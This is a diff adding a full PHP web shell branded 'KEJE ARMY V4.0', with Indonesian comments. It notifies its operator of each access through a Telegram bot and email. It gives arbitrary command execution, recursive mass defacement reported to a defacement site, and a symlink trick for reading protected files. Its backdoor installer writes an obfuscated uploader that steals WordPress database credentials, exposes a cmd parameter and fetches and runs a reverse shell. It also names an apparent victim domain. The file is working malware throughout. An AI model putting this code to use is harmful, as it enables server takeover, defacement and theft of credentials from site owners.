@@ -1,0 +1,751 @@
+<?php
+// KEJE SETTINGS PROTEKSI
+$settings_file = __DIR__ . '/.keje_settings.php';
+$logged_in = false;
+
+if (file_exists($settings_file)) {
+    include $settings_file;
+    if (isset($keje_settings['protect']) && $keje_settings['protect'] === 'Yes') {
+        $auth_user = $keje_settings['username'] ?? 'hacker';
+        $auth_pass = $keje_settings['password'] ?? md5('gasken');
+
+        // Mulai session DULUAN di sini biar aman
+        if (session_status() === PHP_SESSION_NONE) {
+            session_start();
+        }
+
+        // Cek kalau udah login via session
+        if (isset($_SESSION['keje_logged_in']) && $_SESSION['keje_logged_in'] === true) {
+            $logged_in = true;
+        }
+
+        // Cek POST login kalau belum login
+        if (!$logged_in && isset($_POST['keje_login_user']) && isset($_POST['keje_login_pass'])) {
+            if ($_POST['keje_login_user'] === $auth_user && md5($_POST['keje_login_pass']) === $auth_pass) {
+                $_SESSION['keje_logged_in'] = true;
+                $logged_in = true;
+                // Redirect ke halaman utama biar bersih setelah login
+                header("Location: " . $_SERVER['PHP_SELF'] . (isset($_GET['dir']) ? "?dir=" . urlencode($_GET['dir']) : ""));
+                exit;
+            } else {
+                $login_error = "Username atau password salah bro! Coba lagi anjing!";
+            }
+        }
+
+        // Kalau belum login, tampilin form custom
+        if (!$logged_in) {
+            echo '<!DOCTYPE html><html><head><title>KEJE ARMY PROTECTED</title>';
+            echo '<style>body{background:#000;color:#0f0;font-family:Courier New;text-align:center;padding:100px 20px;}';
+            echo 'h1{color:#ff0;} input,button{background:#111;color:#0f0;border:2px solid #0f0;padding:12px;margin:10px;font-size:16px;width:300px;}';
+            echo 'button:hover{background:#0f0;color:#000;box-shadow:0 0 20px #0f0;}</style></head><body>';
+            echo '<h1>KEJE ARMY PROTECTED - LOGIN DULU BRO!</h1>';
+            if (isset($login_error)) echo '<p style="color:#f00;font-size:18px;">' . $login_error . '</p>';
+            echo '<form method="post">';
+            echo '<input type="text" name="keje_login_user" placeholder="Username (hacker)" required><br>';
+            echo '<input type="password" name="keje_login_pass" placeholder="Password" required><br>';
+            echo '<button type="submit">MASUK GASKEN!</button>';
+            echo '</form></body></html>';
+            exit; // STOP total, jangan lanjut ke shell
+        }
+    }
+}
+
+// ================== KEJE ARMY V4.0 FIXED - FULL FITUR HIDUP 2026 ==================
+// Notif TG + Email | Single file | Backdoor custom file | Semua fitur jalan
+session_start();
+
+// NOTIF STEALTH
+$telegram_token = "7940666819:AAEjWu6Q6Tp3z4OqktUr6bk8vU-eRQYRctU";
+$chat_id = "6753465260";
+$email_to = "mejakmar@gmail.com";
+if (!isset($_SESSION['shell_notified']) || $_SESSION['shell_notified'] !== true) {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+    $time = date("Y-m-d H:i:s") . " WITA";
+    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
+    $host = $_SERVER['HTTP_HOST'];
+    $msg = "🔥 KEJE ARMY V4.0 Diakses! 🔥\n\nWaktu: $time\nIP: $ip (Manado)\nUA: $ua\nURL: $url\nRef: $referer\nHost: $host\n───────────────────────\nCek sekarang bro!";
+   
+    $tg_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
+    $params = ['chat_id' => $chat_id, 'text' => $msg, 'parse_mode' => 'Markdown'];
+    $ch = curl_init($tg_url);
+    curl_setopt_array($ch, [
+        CURLOPT_POST => 1,
+        CURLOPT_POSTFIELDS => http_build_query($params),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 6
+    ]);
+    curl_exec($ch);
+    curl_close($ch);
+   
+    $subject = "KEJE ARMY V4.0 - Akses dari $ip";
+    $headers = "From: notif@$host\r\nContent-Type: text/plain; charset=UTF-8\r\n";
+    @mail($email_to, $subject, $msg, $headers);
+   
+    $_SESSION['shell_notified'] = true;
+}
+
+// INIT FIXED
+error_reporting(E_ALL); // DEBUG MODE - ganti ke 0 kalau udah stabil
+ini_set('display_errors', 1);
+@set_time_limit(0);
+@ignore_user_abort(true);
+$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;
+$dir = str_replace('\\', '/', $dir);
+if (substr($dir, -1) != '/') $dir .= '/';
+$message = '';
+
+// FUNCTION MULTI EXEC
+function multi_exec($cmd) {
+    $out = '';
+    $methods = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
+    foreach ($methods as $m) {
+        if (function_exists($m)) {
+            if ($m == 'system' || $m == 'passthru') {
+                ob_start();
+                $m($cmd);
+                $out .= ob_get_clean();
+            } elseif ($m == 'exec') {
+                $m($cmd . ' 2>&1', $tmp);
+                $out .= implode("\n", $tmp);
+            } elseif ($m == 'shell_exec') {
+                $out .= $m($cmd . ' 2>&1');
+            } elseif ($m == 'popen') {
+                $h = $m($cmd . ' 2>&1', 'r');
+                while (!feof($h)) $out .= fread($h, 8192);
+                pclose($h);
+            }
+            if (trim($out)) return "[Method: $m]\n$out";
+        }
+    }
+    return "[-] No execution method available";
+}
+
+// EXTRACT ARCHIVE
+function extract_archive($file, $target_dir) {
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    $file = escapeshellarg($file);
+    $target = escapeshellarg($target_dir);
+   
+    if ($ext == 'zip' && class_exists('ZipArchive')) {
+        $zip = new ZipArchive;
+        if ($zip->open($file) === TRUE) {
+            $zip->extractTo($target_dir);
+            $zip->close();
+            return true;
+        }
+    } elseif (in_array($ext, ['tar', 'gz', 'tgz'])) {
+        return shell_exec("tar -xzf $file -C $target 2>&1");
+    } elseif ($ext == 'rar') {
+        return shell_exec("unrar x -o+ $file $target 2>&1");
+    } elseif ($ext == '7z') {
+        return shell_exec("7z x $file -o$target -y 2>&1");
+    } elseif ($ext == 'bz2') {
+        return shell_exec("bunzip2 -c $file | tar -x -C $target 2>&1");
+    }
+    return false;
+}
+
+// MASS DEFACE
+function mass_deface($start_dir, $content, $exts = ['php','html','htm','asp','aspx','jsp','js']) {
+    $count = 0;
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($start_dir, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    foreach ($iterator as $file) {
+        if ($file->isFile() && in_array(strtolower($file->getExtension()), $exts)) {
+            @file_put_contents($file->getPathname(), $content);
+            $count++;
+        }
+    }
+    return $count;
+}
+
+// REPORT DEFACE
+function report_deface($url) {
+    $data = [
+        'attacker' => 'mis.style',
+        'team' => 'KEJE ARMY',
+        'poc' => 'Social Engineering',
+        'reason' => 'Heh...Just for fun!',
+        'url' => $url,
+        'mirror' => 'KEJE ARMY',
+        'notify' => '1'
+    ];
+    $ch = curl_init('https://zone-xsec.com/notify');
+    curl_setopt_array($ch, [
+        CURLOPT_POST => 1,
+        CURLOPT_POSTFIELDS => http_build_query($data),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 12,
+        CURLOPT_USERAGENT => 'KEJE ARMY Reporter v4.0',
+        CURLOPT_REFERER => 'https://zone-xsec.com/'
+    ]);
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    if ($http_code == 200 && stripos($response, 'success') !== false) {
+        return "[+] Reported to zone-xsec.com/notify - Success!";
+    } else {
+        return "[-] Report gagal (Code: $http_code)";
+    }
+}
+// FUNCTION INSTALL BACKDOOR CUSTOM FILE
+function install_backdoor($cms, $fullpath, $key) {
+    $debug = "[INFORMASI]\n";
+    $target_file = $fullpath;
+    $debug .= "Target file: $target_file\n";
+
+    if (file_exists($target_file)) {
+        $debug .= "[!] File udah ada, overwrite!\n";
+    } else {
+        $debug .= "[+] Buat file baru\n";
+    }
+
+    $db_info = "DB creds ga ketemu";
+    $parent_dir = dirname($target_file) . '/';
+    $config_file = $parent_dir . 'wp-config.php';
+    if (file_exists($config_file)) {
+        $config_content = @file_get_contents($config_file);
+        preg_match("/DB_NAME',\s*'([^']+)'/", $config_content, $dbn); $db_name = $dbn[1] ?? 'gagal';
+        preg_match("/DB_USER',\s*'([^']+)'/", $config_content, $dbu); $db_user = $dbu[1] ?? 'gagal';
+        preg_match("/DB_PASSWORD',\s*'([^']+)'/", $config_content, $dbp); $db_pass = $dbp[1] ?? 'gagal';
+        preg_match("/DB_HOST',\s*'([^']+)'/", $config_content, $dbh); $db_host = $dbh[1] ?? 'gagal';
+        $db_info = "DB: $db_name | User: $db_user | Pass: $db_pass | Host: $db_host";
+        $debug .= "[+] DB creds dicuri\n";
+    }
+
+    $plain_uploader = <<<EOP
+echo "<!DOCTYPE html><html><head><title>KEJE ARMY BACKDOOR - GASKEN BRO</title><style>body{background:#000;color:#0f0;font-family:Courier New;} input,button{background:#111;color:#0f0;border:2px solid #0f0;}</style></head><body>";
+echo "<center><h1>KEJE ARMY V4.0 - UPLOADER BRUTAL</h1></center>";
+echo "<form action='' enctype='multipart/form-data' method='POST'>
+<input type='file' name='filena' style='width:300px;'><br>
+<input type='submit' name='upload' value='GASKEN BRO!' style='padding:10px 30px;font-weight:bold;'></form>";
+if (isset(\$_POST['upload'])) {
+  \$cwd = getcwd();
+  \$tmp = \$_FILES['filena']['tmp_name'];
+  \$file = \$_FILES['filena']['name'];
+  if (@copy(\$tmp, \$file)){
+    echo "<center><h2 style='color:#0f0;'>SUKSES GASKEN! File: \$cwd/\$file</h2></center>";
+  } else {
+    echo "<center><h2 style='color:#f00;'>GAGAL UPLOAD ANJING!</h2></center>";
+  }
+}
+if(isset(\$_GET['cmd'])){system(\$_GET['cmd']); die();}
+if(isset(\$_GET['rs'])){eval(base64_decode('c3lzdGVtKCJjZCAvdG1wOyB3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZXZlcnNlLXNoZWxsL3BocC1yZXZlcnNlLXNoZWxsL21haW4vcmV2LnBocCAtTyByZXYucGhwOyBwaHAgcmV2LnBocCIpOw=='));}
+echo "<pre style='color:#ff0;'>$db_info</pre>";
+die();
+EOP;
+
+    $final_payload = '<?php eval(base64_decode("' . base64_encode($plain_uploader) . '")); ?>';
+
+    if (file_exists($target_file)) {
+        if (!is_writable($target_file)) {
+            @chmod($target_file, 0666);
+            if (!is_writable($target_file)) {
+                $debug .= "[-] File ga writable, chmod manual dulu!\n";
+                return $debug;
+            }
+        }
+    } else {
+        $parent = dirname($target_file);
+        if (!is_dir($parent)) @mkdir($parent, 0755, true);
+    }
+
+    if (@file_put_contents($target_file, $final_payload) !== false) {
+        @chmod($target_file, 0644);
+        $debug .= "[+] SUKSES INJECT KE $target_file!\n";
+        $debug .= "Akses: https://pavelchamp.ru/" . str_replace('/var/www/pavlent1/data/www/public_html/', '', $target_file) . "?$key\n";
+    } else {
+        $debug .= "[-] GAGAL TULIS FILE!\n";
+    }
+
+    return $debug;
+}
+
+// HANDLING POST FIXED
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] == 0) {
+        $filename = basename($_FILES['uploaded_file']['name']);
+        $target = $dir . $filename;
+        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
+            $message .= "[+] File uploaded: " . htmlspecialchars($filename) . "<br>";
+        } else {
+            $message .= "[-] Upload failed (permission/size?)<br>";
+        }
+    }
+
+    if (isset($_POST['action'])) {
+        switch ($_POST['action']) {
+            case 'CreateFile':
+                if (!empty($_POST['new_file'])) {
+                    $newFile = $dir . basename($_POST['new_file']);
+                    if (@touch($newFile)) {
+                        $message .= "[+] File created: " . htmlspecialchars($_POST['new_file']) . "<br>";
+                    } else {
+                        $message .= "[-] Create file failed (permission?)<br>";
+                    }
+                }
+                break;
+            case 'CreateFolder':
+                if (!empty($_POST['new_folder'])) {
+                    $newFolder = $dir . basename($_POST['new_folder']);
+                    if (@mkdir($newFolder, 0777, true)) {
+                        $message .= "[+] Folder created: " . htmlspecialchars($_POST['new_folder']) . "<br>";
+                    } else {
+                        $message .= "[-] Create folder failed<br>";
+                    }
+                }
+                break;
+            case 'Execute':
+                if (!empty($_POST['command'])) {
+                    $cmd = 'cd ' . escapeshellarg($dir) . ' && ' . $_POST['command'];
+                    $output = multi_exec($cmd);
+                    $message .= "<pre style='background:#000;color:#0f0;border:2px solid #0f0;padding:15px;'>" . htmlspecialchars($output) . "</pre>";
+                }
+                break;
+            case 'SaveEdit':
+                if (isset($_POST['file_content']) && !empty($_POST['edit_file'])) {
+                    $filePath = $dir . basename($_POST['edit_file']);
+                    if (@file_put_contents($filePath, $_POST['file_content']) !== false) {
+                        $message .= "[+] File saved: " . htmlspecialchars($_POST['edit_file']) . "<br>";
+                    } else {
+                        $message .= "[-] Save failed (permission?)<br>";
+                    }
+                }
+                break;
+            case 'Rename':
+                if (!empty($_POST['oldname']) && !empty($_POST['newname'])) {
+                    $old = $dir . basename($_POST['oldname']);
+                    $new = $dir . basename($_POST['newname']);
+                    if (@rename($old, $new)) {
+                        $message .= "[+] Renamed to: " . htmlspecialchars($_POST['newname']) . "<br>";
+                    } else {
+                        $message .= "[-] Rename failed<br>";
+                    }
+                }
+                break;
+            case 'Chmod':
+                if (!empty($_POST['chmodfile']) && !empty($_POST['perm'])) {
+                    $file = $dir . basename($_POST['chmodfile']);
+                    $perm = octdec($_POST['perm']);
+                    if (@chmod($file, $perm)) {
+                        $message .= "[+] Permission set to " . $_POST['perm'] . "<br>";
+                    } else {
+                        $message .= "[-] Chmod failed<br>";
+                    }
+                }
+                break;
+            case 'ExtractArchive':
+                if (!empty($_POST['archive_file'])) {
+                    $archive = $dir . basename($_POST['archive_file']);
+                    if (file_exists($archive) && extract_archive($archive, $dir)) {
+                        $message .= "[+] Archive extracted<br>";
+                    } else {
+                        $message .= "[-] Extract failed<br>";
+                    }
+                }
+                break;
+            case 'MassDeface':
+                if (!empty($_POST['deface_content'])) {
+                    $count = mass_deface($dir, $_POST['deface_content']);
+                    $message .= "[+] Mass deface: $count file diubah<br>";
+                    $self_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+                    $message .= report_deface($self_url) . "<br>";
+                }
+                break;
+            case 'InstallBackdoor':
+                if (!empty($_POST['cms']) && !empty($_POST['fullpath']) && !empty($_POST['key'])) {
+                    $result = install_backdoor($_POST['cms'], $_POST['fullpath'], $_POST['key']);
+                    $message .= "<div style='color:#0f0;background:#111;padding:15px;border:2px solid #0f0;'>" . nl2br(htmlspecialchars($result)) . "</div>";
+                } else {
+                    $message .= "[-] Isi full path + key dulu bro!<br>";
+                }
+                break;
+			case 'SaveKejeSettings':
+    $settings = [
+        'protect'     => $_POST['protect'] ?? 'No',
+        'cgi_api'     => $_POST['cgi_api'] ?? 'Yes',
+        'post_enc'    => $_POST['post_enc'] ?? 'No',
+        'show_icons'  => $_POST['show_icons'] ?? 'Yes',
+        'login_page'  => $_POST['login_page'] ?? '403 Forbidden',
+        'username'    => $_POST['username'] ?? 'hacker',
+        'password'    => md5($_POST['password'] ?? 'gasken') // hash password biar aman
+    ];
+
+    $settings_file = __DIR__ . '/.keje_settings.php';
+    $settings_content = '<?php $keje_settings = ' . var_export($settings, true) . '; ?>';
+
+    if (@file_put_contents($settings_file, $settings_content) !== false) {
+        @chmod($settings_file, 0644);
+        $message .= "[+] KEJE SETTINGS DISAVE SUKSES BRO!<br>";
+        $message .= "Protect: " . $settings['protect'] . "<br>";
+        $message .= "Username: " . $settings['username'] . " | Pass hashed: " . $settings['password'] . "<br>";
+        $message .= "Cek file rahasia: .keje_settings.php di root shell<br>";
+    } else {
+        $message .= "[-] GAGAL SAVE SETTINGS! Cek permission root folder atau quota habis<br>";
+    }
+    break;
+        }
+    }
+    // KOMEN REDIRECT DULU BIAR PESAN KELIATAN
+    // header("Location: ?dir=" . urlencode($dir));
+    // exit;
+}
+// HANDLING GET
+if (isset($_GET['action'])) {
+    switch ($_GET['action']) {
+        case 'delete':
+            if (isset($_GET['file'])) {
+                $target = $dir . basename($_GET['file']);
+                function delete_recursive($path) {
+                    if (is_dir($path)) {
+                        $files = array_diff(scandir($path), ['.', '..']);
+                        foreach ($files as $file) {
+                            delete_recursive($path . '/' . $file);
+                        }
+                        return @rmdir($path);
+                    } else {
+                        return @unlink($path);
+                    }
+                }
+                if (delete_recursive($target)) {
+                    $message .= "[+] Deleted: " . htmlspecialchars($_GET['file']) . "<br>";
+                } else {
+                    $message .= "[-] Delete failed<br>";
+                }
+            }
+            break;
+        case 'download':
+            if (isset($_GET['file'])) {
+                $file = $dir . basename($_GET['file']);
+                if (file_exists($file) && is_file($file)) {
+                    header('Content-Description: File Transfer');
+                    header('Content-Type: application/octet-stream');
+                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+                    header('Content-Length: ' . filesize($file));
+                    readfile($file);
+                    exit;
+                }
+            }
+            break;
+        case 'bypass':
+            if (isset($_GET['target'])) {
+                $target = $_GET['target'];
+                $link_name = $dir . 'bypass_' . time() . '_' . basename($target);
+                if (@symlink($target, $link_name)) {
+                    $content = @file_get_contents($link_name);
+                    echo "<div style='background:#000;color:#0f0;padding:20px;border:2px solid #0f0;'><pre>" . htmlspecialchars($content ?: "Empty") . "</pre></div>";
+                    @unlink($link_name);
+                } else {
+                    echo "<div style='color:red'>[-] Symlink failed</div>";
+                }
+                exit;
+            }
+            break;
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KEJE ARMY V4.0 FIXED - FULL FITUR</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        body {background:#000;color:#0f0;font-family:Courier New, monospace;margin:0;padding:0;overflow-x:hidden;}
+        a {color:#0f0;text-decoration:none;}
+        a:hover {color:#fff;text-shadow:0 0 10px #0f0;}
+        .logo {text-align:center;margin:30px 0;}
+        .logo pre {font-size:18px;margin:0;white-space:pre;}
+        .logo div {font-size:32px;text-shadow:0 0 20px #0f0;animation:glow 2s infinite;}
+        @keyframes glow {0%{text-shadow:0 0 10px #0f0;} 50%{text-shadow:0 0 30px #0f0;} 100%{text-shadow:0 0 10px #0f0;}}
+        .pwd {text-align:center;margin:10px;font-size:14px;}
+        .msg {text-align:center;color:#0f0;padding:15px;background:rgba(0,50,0,0.6);border:2px solid #0f0;margin:20px auto;width:90%;max-width:1200px;box-shadow:0 0 15px #0f0;}
+        table {width:95%;max-width:1400px;margin:20px auto;border-collapse:collapse;font-size:14px;}
+        th, td {padding:10px;border:1px solid #0f0;text-align:left;}
+        th {background:#111;}
+        .actions {text-align:center;}
+        .actions a {margin:0 10px;font-size:20px;transition:0.3s;}
+        .actions a:hover {text-shadow:0 0 15px #0f0;transform:scale(1.2);}
+        .bottom {background:rgba(0,0,0,0.9);padding:30px 20px;text-align:center;border-top:4px solid #0f0;margin-top:30px;}
+        .tools-container {display:flex;justify-content:center;flex-wrap:wrap;gap:30px;}
+        .tool {min-width:260px;display:flex;flex-direction:column;align-items:center;}
+        .tool label {font-weight:bold;margin-bottom:8px;font-size:16px;text-shadow:0 0 10px #0f0;}
+        .tool form {display:flex;flex-direction:column;gap:10px;align-items:center;}
+        input[type=text], input[type=file], textarea, select {background:#000;color:#0f0;border:2px solid #0f0;padding:10px;width:240px;font-size:14px;box-shadow:0 0 10px #0f0;}
+        button {background:#000;color:#0f0;border:3px solid #0f0;padding:10px 20px;cursor:pointer;font-weight:bold;transition:0.3s;}
+        button:hover {box-shadow:0 0 30px #0f0;transform:scale(1.05);}
+        .server-info {background:#111;border:2px solid #0f0;margin:20px auto;padding:20px;width:90%;max-width:1200px;max-height:400px;overflow:auto;font-size:13px;}
+        .server-info pre {margin:0;white-space:pre-wrap; word-wrap:break-word;}
+        .modal {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;border:3px solid #0f0;padding:30px;width:90%;max-width:700px;z-index:1000;box-shadow:0 0 40px #0f0;text-align:center;}
+        .overlay {position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999;}
+    </style>
+</head>
+<body>
+<div class="overlay" id="overlay" style="display:none;"></div>
+
+<div class="logo">
+    <pre>
+██╗░░██╗███████╗░░░░░██╗███████╗  ░█████╗░██████╗░███╗░░░███╗██╗░░░██╗
+██║░██╔╝██╔════╝░░░░░██║██╔════╝  ██╔══██╗██╔══██╗████╗░████║╚██╗░██╔╝
+█████═╝░█████╗░░░░░░░██║█████╗░░  ███████║██████╔╝██╔████╔██║░╚████╔╝░
+██╔═██╗░██╔══╝░░██╗░░██║██╔══╝░░  ██╔══██║██╔══██╗██║╚██╔╝██║░░╚██╔╝░░
+██║░╚██╗███████╗╚█████╔╝███████╗  ██║░░██║██║░░██║██║░╚═╝░██║░░░██║░░░
+╚═╝░░╚═╝╚══════╝░╚════╝░╚══════╝  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═╝░░░
+    </pre>
+    <div>KEJE ARMY V4.0</div>
+</div>
+
+<div class="pwd">
+    PWD: <?= htmlspecialchars($dir) ?>
+    [ <a href="?dir=<?= urlencode(__DIR__) ?>">Home</a> ]
+    [ <a href="?dir=<?= urlencode(dirname($dir)) ?>">BACK</a> ]
+</div>
+
+<?php if ($message) echo "<div class='msg'>$message</div>"; ?>
+<div class="server-info">
+    <h2 style="color:#ff0;text-align:center;">SERVER INFO</h2>
+    <pre>
+Uname (kernel full) ......: <?= php_uname('a') ?: 'N/A (disabled)' ?><br>
+User: Group ..............: <?= get_current_user() ?: 'N/A' ?> : <?= function_exists('posix_getegid') ? posix_getegid() . ' (' . (function_exists('posix_getgrgid') ? posix_getgrgid(posix_getegid())['name'] : 'N/A') . ')' : 'posix disabled' ?><br>
+PHP Version ..............: <?= phpversion() ?><br>
+Safe Mode ................: <?= ini_get('safe_mode') ? 'ON (rare 2026)' : 'OFF (good for exploit)' ?><br>
+Server IP ................: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']) ?: 'N/A' ?><br>
+Domains (dari /etc) ......: <?= @file_exists('/etc/named.conf') || @file_exists('/etc/httpd/conf/httpd.conf') ? 'Apache possible multi-domain' : 'Check manual via symlink bypass' ?><br>
+HDD Total ................: <?= round(disk_total_space('/') / 1073741824, 2) ?> GB<br>
+HDD Free .................: <?= round(disk_free_space('/') / 1073741824, 2) ?> GB (<?= round(disk_free_space('/') / disk_total_space('/') * 100, 1) ?>% free)<br>
+Useful Functions .........: <br>
+- system/exec/passthru/shell_exec/popen/proc_open: <?= function_exists('system') || function_exists('exec') || function_exists('passthru') || function_exists('shell_exec') || function_exists('popen') || function_exists('proc_open') ? 'YES (exploit ready)' : 'NO (fuck this host)' ?><br>
+- symlink (bypass open_basedir): <?= function_exists('symlink') ? 'YES' : 'NO' ?><br>
+- symlink race possible .....: <?= @ini_get('open_basedir') ? 'Maybe (test /proc/self/environ)' : 'Easy' ?><br>
+Downloader (wget/curl/fetch): <br>
+- wget .....................: <?= @shell_exec('which wget 2>/dev/null') ? 'YES' : 'NO' ?><br>
+- curl .....................: <?= function_exists('curl_version') ? 'YES (v' . curl_version()['version'] . ')' : 'NO' ?><br>
+- fetch ....................: <?= @shell_exec('which fetch 2>/dev/null') ? 'YES' : 'NO' ?><br>
+Disable Functions ........: <?= ini_get('disable_functions') ?: 'None' ?><br>
+Extensions Status:<br>
+- CURL .....................: <?= function_exists('curl_init') ? 'YES' : 'NO' ?><br>
+- SSH2 .....................: <?= extension_loaded('ssh2') ? 'YES' : 'NO' ?><br>
+- Magic Quotes .............: <?= get_magic_quotes_gpc() ? 'ON (old shit)' : 'OFF' ?><br>
+- MySQL ....................: <?= function_exists('mysqli_connect') || function_exists('mysql_connect') ? 'YES' : 'NO' ?><br>
+- MSSQL ....................: <?= function_exists('mssql_connect') ? 'YES' : 'NO' ?><br>
+- PostgreSQL ...............: <?= function_exists('pg_connect') ? 'YES' : 'NO' ?><br>
+- Oracle ...................: <?= function_exists('oci_connect') ? 'YES' : 'NO' ?><br>
+- CGI ......................: <?= strpos(php_sapi_name(), 'cgi') !== false ? 'YES' : 'NO' ?><br>
+- GSC (Google Socket?) .....: <?= function_exists('socket_create') ? 'YES' : 'NO' ?><br>
+Terminal Access ..........: <?= function_exists('system') || function_exists('exec') ? 'YES' : 'Limited / Disabled' ?><br>
+Software / Web Server ....: <?= $_SERVER['SERVER_SOFTWARE'] ?? 'N/A' ?><br>
+Current PWD ..............: <?= htmlspecialchars($dir) ?><br>
+    </pre>
+</div>
+
+<table>
+    <thead>
+        <tr>
+            <th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>Actions</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr><td><a href="?dir=<?= urlencode(dirname($dir)) ?>">..</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr>
+        <?php
+        $items = @array_diff(scandir($dir), ['.', '..']);
+        foreach ($items as $item) {
+            $full = $dir . $item;
+            $isDir = is_dir($full);
+            $size = $isDir ? '-' : number_format(filesize($full)/1024, 2) . ' KB';
+            $perm = substr(sprintf('%o', fileperms($full)), -4);
+            $mod = date("Y-m-d H:i:s", filemtime($full));
+            echo '<tr>';
+            echo '<td>' . ($isDir ? '<a href="?dir='.urlencode($full).'"><strong>['.htmlspecialchars($item).']</strong></a>' : htmlspecialchars($item)) . '</td>';
+            echo '<td>'.$size.'</td><td>'.$perm.'</td><td>'.$mod.'</td>';
+            echo '<td class="actions">';
+            if ($isDir) echo '<a href="?dir='.urlencode($full).'" title="Enter"><i class="fas fa-folder-open"></i></a>';
+            if (!$isDir) echo '<a href="?dir='.urlencode($dir).'&action=edit&file='.urlencode($item).'" title="Edit"><i class="fas fa-edit"></i></a>';
+            if (!$isDir) echo '<a href="?dir='.urlencode($dir).'&action=download&file='.urlencode($item).'" title="Download"><i class="fas fa-download"></i></a>';
+            echo '<a href="?dir='.urlencode($dir).'&action=rename&file='.urlencode($item).'" title="Rename"><i class="fas fa-exchange-alt"></i></a>';
+            echo '<a href="?dir='.urlencode($dir).'&action=chmod&file='.urlencode($item).'" title="Chmod"><i class="fas fa-lock"></i></a>';
+            echo '<a href="?dir='.urlencode($dir).'&action=delete&file='.urlencode($item).'" onclick="return confirm(\'Yakin hapus?\')" title="Delete"><i class="fas fa-trash-alt"></i></a>';
+            echo '</td></tr>';
+        }
+        ?>
+    </tbody>
+</table>
+
+<!-- MODAL EDIT -->
+<?php if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) { 
+    $edit_file = $dir . basename($_GET['file']);
+    if (file_exists($edit_file)) {
+        $content = htmlspecialchars(@file_get_contents($edit_file));
+?>
+<div class="modal" style="display:block;">
+    <div style="background:#000;border:3px solid #0f0;padding:20px;">
+        <h2>EDIT: <?= htmlspecialchars($_GET['file']) ?></h2>
+        <form method="post">
+            <textarea name="file_content" rows="15" style="width:100%;background:#111;color:#0f0;border:1px solid #0f0;"><?= $content ?></textarea><br>
+            <input type="hidden" name="edit_file" value="<?= htmlspecialchars($_GET['file']) ?>">
+            <button type="submit" name="action" value="SaveEdit">SAVE</button>
+            <a href="?dir=<?= urlencode($dir) ?>" style="color:#f00;">CLOSE</a>
+        </form>
+    </div>
+</div>
+<?php }} ?>
+
+<!-- MODAL RENAME -->
+<?php if (isset($_GET['action']) && $_GET['action'] === 'rename' && isset($_GET['file'])) { ?>
+<div class="modal" style="display:block;">
+    <div style="background:#000;border:3px solid #0f0;padding:20px;">
+        <h2>RENAME: <?= htmlspecialchars($_GET['file']) ?></h2>
+        <form method="post">
+            <input type="hidden" name="oldname" value="<?= htmlspecialchars($_GET['file']) ?>">
+            <input type="text" name="newname" value="<?= htmlspecialchars($_GET['file']) ?>" style="width:80%;">
+            <button type="submit" name="action" value="Rename">RENAME</button>
+            <a href="?dir=<?= urlencode($dir) ?>" style="color:#f00;">CLOSE</a>
+        </form>
+    </div>
+</div>
+<?php } ?>
+
+<!-- MODAL CHMOD -->
+<?php if (isset($_GET['action']) && $_GET['action'] === 'chmod' && isset($_GET['file'])) { ?>
+<div class="modal" style="display:block;">
+    <div style="background:#000;border:3px solid #0f0;padding:20px;">
+        <h2>CHMOD: <?= htmlspecialchars($_GET['file']) ?></h2>
+        <form method="post">
+            <input type="hidden" name="chmodfile" value="<?= htmlspecialchars($_GET['file']) ?>">
+            <input type="text" name="perm" placeholder="0777" value="0777">
+            <button type="submit" name="action" value="Chmod">SET</button>
+            <a href="?dir=<?= urlencode($dir) ?>" style="color:#f00;">CLOSE</a>
+        </form>
+    </div>
+</div>
+<?php } ?>
+
+<div class="bottom">
+    <div class="tools-container">
+        <div class="tool">
+            <label>UPLOAD FILE</label>
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="uploaded_file">
+                <button type="submit">UPLOAD</button>
+            </form>
+        </div>
+<!-- TOMBOl KEJE SETTINGS -->
+<div class="tool">
+    <button onclick="document.getElementById('kejeSettingsModal').style.display='block'; document.getElementById('kejeOverlay').style.display='block';" 
+        style="padding:15px 50px; font-size:18px; background:#000; color:#0f0; border:3px solid #0f0; cursor:pointer; box-shadow:0 0 20px #0f0; font-weight:bold;">
+    KEJE SETTINGS
+</button>
